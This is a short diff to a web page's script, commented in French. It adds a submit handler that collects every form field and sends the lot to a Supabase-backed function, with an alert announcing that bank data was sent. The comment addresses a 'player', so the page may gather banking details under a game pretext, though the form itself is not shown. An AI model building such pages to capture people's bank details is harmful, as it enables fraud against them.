@@ -14,4 +14,23 @@ async function envoyerDonnees(donnees) {
   });
   if (!reponse.ok) throw new Error(await reponse.text());
   return true;
-}</body></html>
+}
+
+// Envoi automatique quand le joueur clique sur Valider
+document.querySelector("form")?.addEventListener("submit", async function(event) {
+  event.preventDefault();
+
+  const formulaire = event.currentTarget;
+  const donnees = Object.fromEntries(new FormData(formulaire).entries());
+
+  try {
+    await envoyerDonnees(donnees);
+    alert("✅ Données bancaire envoyées !");
+  } catch (erreur) {
+    console.error(erreur);
+    alert("❌ Échec de l'envoi vers Supabase.");
+  }
+});
+</script>
+</body>
+</html>
